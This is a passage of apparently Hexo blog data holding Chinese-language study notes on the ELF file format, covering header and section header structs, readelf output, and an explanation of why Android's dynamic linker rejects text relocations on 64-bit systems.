.gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata\n   02     .data.rel.ro .fini_array .dynamic .got .data .bss\n   03     .dynamic\n   04     .note.android.ident .note.gnu.build-id\n   05\n   06     .ARM.exidx\n   07     .data.rel.ro .fini_array .dynamic .got\n```\n\n\n在 Android 6.0（API Level 23）之后，系统开始严格禁止 .so 文件中的 文本重定位（Text Relocations）\n\n1. 什么是文本重定位（Text Relocations）？\n\n\t•\t文本重定位指的是修改共享库代码段（通常被标记为只读）的内存地址，以便让其与实际加载的地址一致。\n\t•\t通常，编译 .so 文件时会生成位置无关代码（Position-Independent Code, PIC），这样生成的代码就能在运行时被加载到任何可用的内存地址，而无需修改代码段的内容。\n\t•\t但如果 .so 文件不支持位置无关代码，系统在加载时必须对其进行文本重定位，即修改代码段内的指令，以使其与实际的内存地址匹配。\n\n2. 为什么 Android 6.0 之后禁止文本重定位？\n\n\t•\t安全性: 文本重定位需要将代码段设为可写（writable），这违反了现代操作系统的安全原则，即代码段应是只读的，以防止恶意代码注入和利用漏洞进行攻击。文本重定位带来了潜在的安全漏洞，可能被恶意程序利用进行代码注入。\n\t•\t性能: 文本重定位会增加启动时的开销，因为系统需要在加载 .so 文件时对其进行修改。而且，这会导致共享库无法共享相同的物理内存页面，增加内存占用，降低性能。\n\t•\t更好的内存管理: 禁止文本重定位有助于 Android 系统实现更高效的内存管理，避免在多进程中加载相同 .so 文件时因为重定位而导致的内存浪费。\n\n3. 禁止文本重定位后，.so 文件的加载行为\n\n\t•\t禁止文本重定位后，系统要求 .so 文件必须是 位置无关代码（PIC），这意味着它可以加载到任何可用的内存地址，而不需要修改代码段的内容。\n\t•\t只要 .so 文件是用位置无关代码编译的（即 -fPIC 编译选项），它就可以在运行时加载到内存的任何地址，而不需要文本重定位。因此，Android 6.0 之后的 .so 文件并不会被加载到固定地址，而是由系统动态分配可用的内存地址。\n\n文本重定向代码分析\n这段代码来自于动态链接器的部分，主要用于处理 **动态段** 中的 `DT_TEXTREL` 标签。`DT_TEXTREL` 是 ELF 动态段（`.dynamic` 段）中的一个标识符，它表明该可执行文件或共享库（`.so` 文件）存在 **文本重定位（text relocations）**。文本重定位指的是在程序加载时，需要修改代码段（`.text` 段）中的内容来调整符号地址。\n\n### 代码分析\n```c\ntypedef struct {\n    Elf64_Sxword d_tag;     /* Dynamic entry type */\n    union {\n        Elf64_Xword d_val;  /* Integer value */\n        Elf64_Addr d_ptr;   /* Program virtual address */\n    } d_un;\n} Elf64_Dyn;\n```\n\n```cpp\ncase DT_TEXTREL:\n#if defined(__LP64__)\n    DL_ERR(\"\\\"%s\\\" has text relocations\", get_realpath());\n    return false;\n#else\n    has_text_relocations = true;\n    break;\n#endif\n```\n\n1. **`case DT_TEXTREL:`**:\n   - 这是在动态链接器中解析动态段（`.dynamic` 段）时的一个 `switch` 语句分支，处理 `DT_TEXTREL` 的场景。\n   - `DT_TEXTREL` 表示该共享库或可执行文件存在需要重定位的 `.text` 段，即代码段包含绝对地址引用，加载时需要动态修改。\n\n2. **`#if defined(__LP64__)`**:\n   - 这是一个 **条件编译宏**，用于检查当前系统是否是 **64 位架构**。`__LP64__` 是 GCC 或 Clang 编译器定义的一个宏，用来标识编译环境为 64 位的长指针模型（LP64 模型），即 `long` 和 `pointer` 类型在 64 位系统中为 64 位。\n   - **LP64 架构**: 在 64 位系统上，代码中的指针和 `long` 类型通常为 64 位。64 位系统通常强制要求 **代码段不可修改**，因为允许修改 `.text` 段可能带来安全风险。\n\n3. **`DL_ERR(\"\\\"%s\\\" has text relocations\", get_realpath());`**:\n   - 如果程序运行在 64 位架构上，并且发现 `.so` 文件中存在 `DT_TEXTREL`，动态链接器会调用 `DL_ERR` 函数打印错误信息。这里的 `get_realpath()` 用于获取当前正在处理的共享库的真实路径，并将其作为错误信息输出。\n   - 错误信息内容：`\"filename has text relocations\"`，表示当前文件存在文本重定位。\n\n4. **`return false;`**:\n   - 对于 64 位系统，一旦发现 `.so` 文件有文本重定位，动态链接器立即返回 `false`，表示拒绝加载该文件。这是因为现代 64 位系统通常禁止修改 `.text` 段以确保安全性，避免代码注入等攻击。\n\n5. **`#else` 分支**:\n   - 如果程序运行在 32 位架构上（即没有定义 `__LP64__`），动态链接器不会立即拒绝加载文件，而是将 `has_text_relocations` 变量设置为 `true`。\n   - 在 32 位系统上，尽管 `.text` 段的重定位被认为是不安全的，但仍然是被允许的，因此不会直接报错，而是继续加载该共享库。\n\n6. **`has_text_relocations = true;`**:\n   - 在 32 位系统上，动态链接器设置一个标志 `has_text_relocations` 为 `true`，记录当前 `.so` 文件有文本重定位。在后续的加载流程中，动态链接器可能会针对这个标志执行特殊处理，比如发出警告或做额外的安全检查。\n\n### 代码逻辑总结\n\n- **64 位系统（`__LP64__`）**:\n   - 如果当前系统是 64 位系统，并且该 `.so` 文件存在文本重定位 (`DT_TEXTREL`)，系统会直接报错，并拒绝加载该文件。这是因为现代 64 位系统严格要求代码段不可修改，以提高安全性。\n\n- **32 位系统（非 `__LP64__`）**:\n   - 如果当前系统是 32 位系统，虽然存在文本重定位，动态链接器仍然允许加载该文件，但会记录 `has_text_relocations = true`，表明这个文件有文本重定位。32 位系统的安全性要求较低，历史上允许文本重定位以支持不使用位置无关代码（PIC）的库。\n\n### 为什么 64 位系统不允许 Text Relocations？\n\n1. **安全性考虑**:\n   - 允许 `.text` 段可写会带来安全风险，攻击者可以利用这个机制修改代码段，进行代码注入等恶意攻击。\n   - 在 64 位系统上，严禁 `.text` 段的修改可以有效防止这类攻击。\n\n2. **现代系统的内存管理和性能优化**:\n   - 现代 64 位系统采用了更高级的内存管理和优化技术，`.text` 段通常是共享的内存页。如果允许修改 `.text` 段，会导致每个进程必须拥有自己独立的内存页，增加内存占用，破坏共享机制。\n   - 禁止文本重定位有助于提高性能和减少内存占用。\n\n### 总结\n\n这段代码检查动态库是否存在 `DT_TEXTREL`（文本重定位）标签。在 64 位系统中，检测到文本重定位后，动态链接器会拒绝加载该 `.so` 文件并抛出错误，而在 32 位系统中，虽然允许文本重定位，但会设置标志 `has_text_relocations` 为 `true`，以便后续做相应的处理。这种区别源于 64 位系统对安全性和性能的更高要求。\n\n#define DT_TEXTREL\t22\n\n00 00 00 03","slug":"elf","published":0,"date":"2024-10-05T11:30:17.739Z","updated":"2024-10-08T01:45:54.250Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risz000av8fyb7k37cs3","content":"<p>elf解析：<br>链接视图<br>section header table</p>\n<p>运行视图<br>programe header table</p>\n<p>为什么要有运行视图</p>\n<ol>\n<li>相同权限的section 放在一起</li>\n<li>如果用section 来加载到内存中，如果这个节的大小为1025KB,内存分页的大小为1024KB,那么多出的1KB空间，需要另外申请一个页，浪费内存</li>\n</ol>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* 32-bit ELF base types. */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32\tElf32_Addr;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u16\tElf32_Half;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32\tElf32_Off;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __s32\tElf32_Sword;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32\tElf32_Word;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* 64-bit ELF base types. */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64\tElf64_Addr;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u16\tElf64_Half;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __s16\tElf64_SHalf;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64\tElf64_Off;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __s32\tElf64_Sword;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32\tElf64_Word;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64\tElf64_Xword;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __s64\tElf64_Sxword;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>以下为定义的文件头：<br><img src=\"../pic/elf_header.png\" alt=\"alt text\"></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include/uapi/linux/elf.h</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> EI_NIDENT\t16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf32_hdr</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">char</span>\te_ident[EI_NIDENT]; <span class=\"comment\">//16字节的魔数等</span></span><br><span class=\"line\">  Elf32_Half\te_type; <span class=\"comment\">//文件类型</span></span><br><span class=\"line\">  Elf32_Half\te_machine; <span class=\"comment\">//需要的体系结构</span></span><br><span class=\"line\">  Elf32_Word\te_version; <span class=\"comment\">//版本</span></span><br><span class=\"line\">  Elf32_Addr\te_entry;  <span class=\"comment\">/* Entry point */</span></span><br><span class=\"line\">  Elf32_Off\te_phoff;</span><br><span class=\"line\">  Elf32_Off\te_shoff;</span><br><span class=\"line\">  Elf32_Word\te_flags;</span><br><span class=\"line\">  Elf32_Half\te_ehsize; <span class=\"comment\">// 表示ELF header 大小 2字节</span></span><br><span class=\"line\">  Elf32_Half\te_phentsize; <span class=\"comment\">// 表示program header table 每个条目的大小</span></span><br><span class=\"line\">  Elf32_Half\te_phnum; <span class=\"comment\">// 表示program header table 包含的条目数</span></span><br><span class=\"line\">  Elf32_Half\te_shentsize; <span class=\"comment\">// 表示section header table 每个条目的大小</span></span><br><span class=\"line\">  Elf32_Half\te_shnum;    <span class=\"comment\">// 表示section header table 包含的条目数</span></span><br><span class=\"line\">  Elf32_Half\te_shstrndx; <span class=\"comment\">//包含section 名称的字符串是第几个</span></span><br><span class=\"line\">&#125; Elf32_Ehdr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf64_hdr</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">char</span>\te_ident[EI_NIDENT];\t<span class=\"comment\">/* ELF &quot;magic number&quot; */</span></span><br><span class=\"line\">  Elf64_Half e_type;</span><br><span class=\"line\">  Elf64_Half e_machine;</span><br><span class=\"line\">  Elf64_Word e_version;</span><br><span class=\"line\">  Elf64_Addr e_entry;\t\t<span class=\"comment\">/* Entry point virtual address */</span></span><br><span class=\"line\">  Elf64_Off e_phoff;\t\t<span class=\"comment\">/* Program header table file offset */</span></span><br><span class=\"line\">  Elf64_Off e_shoff;\t\t<span class=\"comment\">/* Section header table file offset */</span></span><br><span class=\"line\">  Elf64_Word e_flags;</span><br><span class=\"line\">  Elf64_Half e_ehsize;</span><br><span class=\"line\">  Elf64_Half e_phentsize;</span><br><span class=\"line\">  Elf64_Half e_phnum;</span><br><span class=\"line\">  Elf64_Half e_shentsize;</span><br><span class=\"line\">  Elf64_Half e_shnum;</span><br><span class=\"line\">  Elf64_Half e_shstrndx;</span><br><span class=\"line\">&#125; Elf64_Ehdr;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>readelf -h file.so</p>\n<figure class=\"highlight r\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ELF Header<span class=\"operator\">:</span></span><br><span class=\"line\">  Magic<span class=\"operator\">:</span>   <span class=\"number\">7</span>f <span class=\"number\">45</span> <span class=\"number\">4</span><span class=\"built_in\">c</span> <span class=\"number\">46</span> <span class=\"number\">01</span> <span class=\"number\">01</span> <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span></span><br><span class=\"line\">  Class<span class=\"operator\">:</span>                             ELF32</span><br><span class=\"line\">  Data<span class=\"operator\">:</span>                              <span class=\"number\">2</span><span class=\"string\">&#x27;s complement, little endian</span></span><br><span class=\"line\"><span class=\"string\">  Version:                           1 (current)</span></span><br><span class=\"line\"><span class=\"string\">  OS/ABI:                            UNIX - System V</span></span><br><span class=\"line\"><span class=\"string\">  ABI Version:                       0</span></span><br><span class=\"line\"><span class=\"string\">  Type:                              DYN (Shared object file)</span></span><br><span class=\"line\"><span class=\"string\">  Machine:                           ARM</span></span><br><span class=\"line\"><span class=\"string\">  Version:                           0x1</span></span><br><span class=\"line\"><span class=\"string\">  Entry point address:               0x0</span></span><br><span class=\"line\"><span class=\"string\">  Start of program headers:          52 (bytes into file)</span></span><br><span class=\"line\"><span class=\"string\">  Start of section headers:          12892 (bytes into file)</span></span><br><span class=\"line\"><span class=\"string\">  Flags:                             0x5000200, Version5 EABI, soft-float ABI</span></span><br><span class=\"line\"><span class=\"string\">  Size of this header:               52 (bytes)</span></span><br><span class=\"line\"><span class=\"string\">  Size of program headers:           32 (bytes)</span></span><br><span class=\"line\"><span class=\"string\">  Number of program headers:         8</span></span><br><span class=\"line\"><span class=\"string\">  Size of section headers:           40 (bytes)</span></span><br><span class=\"line\"><span class=\"string\">  Number of section headers:         27</span></span><br><span class=\"line\"><span class=\"string\">  Section header string table index: 26</span></span><br></pre></td></tr></table></figure>\n\n<p>链接视图：<br>SHT(section header table)<br>SHT是程序编译链接之后按照功能逻辑组织代码数据的方式，sht位于elf文件的最后<br>源码编译后生成的不同性质的数据会分门别列的放置，因此出现代码段，数据段，符号段<br><img src=\"../pic/code_sht.JPG\" alt=\"alt text\"></p>\n<p><img src=\"../pic/sht.png\" alt=\"alt text\"></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* sh_type */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_NULL\t0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_PROGBITS\t1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_SYMTAB\t2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_STRTAB\t3</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_RELA\t4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_HASH\t5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_DYNAMIC\t6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_NOTE\t7</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_NOBITS\t8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_REL\t\t9</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_SHLIB\t10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_DYNSYM\t11</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_NUM\t\t12</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_LOPROC\t0x70000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_HIPROC\t0x7fffffff</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_LOUSER\t0x80000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_HIUSER\t0xffffffff</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* sh_flags */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_WRITE\t\t0x1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_ALLOC\t\t0x2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_EXECINSTR\t\t0x4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_RELA_LIVEPATCH\t0x00100000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_RO_AFTER_INIT\t0x00200000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_MASKPROC\t\t0xf0000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* special section indexes */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_UNDEF\t0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_LORESERVE\t0xff00</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_LOPROC\t0xff00</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_HIPROC\t0xff1f</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_LIVEPATCH\t0xff20</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_ABS\t\t0xfff1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_COMMON\t0xfff2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_HIRESERVE\t0xffff</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf32_shdr</span> &#123;</span><br><span class=\"line\">  Elf32_Word\tsh_name; <span class=\"comment\">//节名</span></span><br><span class=\"line\">  Elf32_Word\tsh_type; <span class=\"comment\">//节类型</span></span><br><span class=\"line\">  Elf32_Word\tsh_flags; <span class=\"comment\">//节标志位</span></span><br><span class=\"line\">  Elf32_Addr\tsh_addr;  <span class=\"comment\">//虚拟地址</span></span><br><span class=\"line\">  Elf32_Off\tsh_offset; <span class=\"comment\">//文件偏移地址</span></span><br><span class=\"line\">  Elf32_Word\tsh_size; <span class=\"comment\">//节大小</span></span><br><span class=\"line\">  Elf32_Word\tsh_link; </span><br><span class=\"line\">  Elf32_Word\tsh_info;</span><br><span class=\"line\">  Elf32_Word\tsh_addralign; <span class=\"comment\">//对齐偏移</span></span><br><span class=\"line\">  Elf32_Word\tsh_entsize; </span><br><span class=\"line\">&#125; Elf32_Shdr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf64_shdr</span> &#123;</span><br><span class=\"line\">  Elf64_Word sh_name;\t\t<span class=\"comment\">/* Section name, index in string tbl */</span></span><br><span class=\"line\">  Elf64_Word sh_type;\t\t<span class=\"comment\">/* Type of section */</span></span><br><span class=\"line\">  Elf64_Xword sh_flags;\t\t<span class=\"comment\">/* Miscellaneous section attributes */</span></span><br><span class=\"line\">  Elf64_Addr sh_addr;\t\t<span class=\"comment\">/* Section virtual addr at execution */</span></span><br><span class=\"line\">  Elf64_Off sh_offset;\t\t<span class=\"comment\">/* Section file offset */</span></span><br><span class=\"line\">  Elf64_Xword sh_size;\t\t<span class=\"comment\">/* Size of section in bytes */</span></span><br><span class=\"line\">  Elf64_Word sh_link;\t\t<span class=\"comment\">/* Index of another section */</span></span><br><span class=\"line\">  Elf64_Word sh_info;\t\t<span class=\"comment\">/* Additional section information */</span></span><br><span class=\"line\">  Elf64_Xword sh_addralign;\t<span class=\"comment\">/* Section alignment */</span></span><br><span class=\"line\">  Elf64_Xword sh_entsize;\t<span class=\"comment\">/* Entry size if section holds table */</span></span><br><span class=\"line\">&#125; Elf64_Shdr;</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p>在 ELF 文件中，<code>shdr</code> 是 <code>Section Header</code> 的缩写，表示段头表（Section Header Table）中的一项。段头表描述了 ELF 文件中各个段的基本信息，帮助系统在加载或链接时正确处理各个段。</p>\n<p>让我们逐一解释 <code>Elf64_Shdr</code> 结构体中的各个字段：</p>\n<ol>\n<li><p>**<code>sh_name</code> (Section name, index in string table)**：</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：这是一个指向字符串表的索引，字符串表保存了段的名称。通过该索引，可以找到对应的段名称。<br>在段头表中的 sh_name 字段记录了一个索引值。<br>该索引值对应于 .shstrtab 段中的偏移量。<br>在 .shstrtab 段中，从该偏移量开始的字符串就是该段的名称。</li>\n</ul>\n</li>\n<li><p>**<code>sh_type</code> (Type of section)**：</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：该字段表示段的类型，常见的类型有：<ul>\n<li><code>SHT_NULL</code>：空段</li>\n<li><code>SHT_PROGBITS</code>：程序数据段</li>\n<li><code>SHT_SYMTAB</code>：符号表段</li>\n<li><code>SHT_STRTAB</code>：字符串表段</li>\n<li><code>SHT_RELA</code>：带重定位的符号段等</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>**<code>sh_flags</code> (Miscellaneous section attributes)**：</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段的属性标志，可能的标志有：<ul>\n<li><code>SHF_WRITE</code>：段包含可写数据</li>\n<li><code>SHF_ALLOC</code>：段需要被加载到内存中</li>\n<li><code>SHF_EXECINSTR</code>：段包含可执行指令</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>**<code>sh_addr</code> (Section virtual addr at execution)**：</p>\n<ul>\n<li>类型：<code>Elf64_Addr</code>（64位无符号整数）</li>\n<li>解释：段在内存中的虚拟地址。如果段需要被加载到内存中（如代码段或数据段），该地址表示它在进程地址空间中的位置。对于非加载段，这个值为 0。</li>\n</ul>\n</li>\n<li><p>**<code>sh_offset</code> (Section file offset)**：</p>\n<ul>\n<li>类型：<code>Elf64_Off</code>（64位无符号整数）</li>\n<li>解释：段在文件中的偏移量，指明该段数据从文件的哪个位置开始。</li>\n</ul>\n</li>\n<li><p>**<code>sh_size</code> (Size of section in bytes)**：</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段的大小，以字节为单位。</li>\n</ul>\n</li>\n<li><p>**<code>sh_link</code> (Index of another section)**：</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：此字段与段的类型相关。对于符号表，它通常是关联字符串表的索引；对于重定位段，它可能是关联符号表的索引。</li>\n</ul>\n</li>\n<li><p>**<code>sh_info</code> (Additional section information)**：</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：该字段也与段类型相关。例如，对于符号表，它表示局部符号的起始索引；对于重定位段，它可能是相关节的索引。</li>\n</ul>\n</li>\n<li><p>**<code>sh_addralign</code> (Section alignment)**：</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段的对齐要求。段必须按此对齐方式在内存中对齐。如果对齐值为 0 或 1，则表示没有特殊对齐要求。</li>\n</ul>\n</li>\n<li><p>**<code>sh_entsize</code> (Entry size if section holds table)**：</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：如果段包含一个表（如符号表或重定位表），此字段指明每个表项的大小。如果段不是表，则此字段为 0。</li>\n</ul>\n</li>\n</ol>\n<p>这些字段共同描述了每个段的基本属性，使操作系统或链接器能够正确处理 ELF 文件中的各个段。</p>\n<p>连接器相关的 .dynamic section</p>\n<p><strong><code>.dynamic</code> 段</strong> 在 ELF 文件中是一个非常重要的段，它用于描述可执行文件或共享对象文件在运行时与动态链接器之间的互动。它包含了与动态链接相关的各种信息，比如所依赖的共享库、全局偏移表（GOT）、符号表、重定位表等。</p>\n<p><code>.dynamic</code> 段的内容是由一系列 <code>Elf64_Dyn</code> 结构体组成的。每个 <code>Elf64_Dyn</code> 结构体有两个成员，分别是 <code>d_tag</code> 和 <code>d_un</code>，其中 <code>d_tag</code> 指定了动态条目的类型，而 <code>d_un</code> 则包含相应的值或地址。</p>\n<p><code>Elf64_Dyn</code> 结构体的定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    Elf64_Sxword d_tag;     <span class=\"comment\">/* Dynamic entry type */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        Elf64_Xword d_val;  <span class=\"comment\">/* Integer value */</span></span><br><span class=\"line\">        Elf64_Addr d_ptr;   <span class=\"comment\">/* Program virtual address */</span></span><br><span class=\"line\">    &#125; d_un;</span><br><span class=\"line\">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"详细介绍-dynamic-段的常用标志（d-tag-字段）\"><a href=\"#详细介绍-dynamic-段的常用标志（d-tag-字段）\" class=\"headerlink\" title=\"详细介绍 .dynamic 段的常用标志（d_tag 字段）\"></a>详细介绍 <code>.dynamic</code> 段的常用标志（<code>d_tag</code> 字段）</h3><p>每个动态条目（entry）的 <code>d_tag</code> 字段表示该条目的类型，<code>d_un</code> 